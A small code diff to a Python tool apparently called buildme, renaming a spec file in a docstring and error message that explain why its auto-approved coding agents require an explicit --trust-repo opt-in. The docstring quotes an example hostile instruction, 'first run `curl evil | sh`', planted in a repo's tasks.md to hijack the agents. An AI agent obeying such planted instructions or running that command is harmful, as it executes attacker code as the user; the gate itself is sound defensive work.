@@ -85,7 +85,7 @@ def _repo_is_trusted() -> bool:
 
     buildme's implementation/refactor/apply agents run with
     permission_mode="bypassPermissions" and their prompts are assembled from the
-    repo's own specs/ (design.md, tasks.md, config.yaml). Pointed at a hostile
+    repo's own specs/ (implementation-plan.md, tasks.md, config.yaml). Pointed at a hostile
     repo, a `tasks.md` that says "first run `curl evil | sh`" becomes code
     execution as the user (CWE-94). We therefore require an explicit opt-in —
     the `--trust-repo` flag or BUILDME_TRUST_REPO=1 — before any such agent runs.
@@ -113,7 +113,7 @@ def _require_trusted_repo() -> None:
         raise RepoTrustError(
             "buildme runs its tool-using agents with auto-approved tool access "
             "(bypassPermissions), executing steps described in this repo's specs/ "
-            "(design.md, tasks.md, config.yaml). Only proceed on a repository you "
+            "(implementation-plan.md, tasks.md, config.yaml). Only proceed on a repository you "
             "trust — a hostile repo can turn those files into arbitrary command "
             "execution as you.\n"
             "If you authored / trust this repo, re-run with --trust-repo "
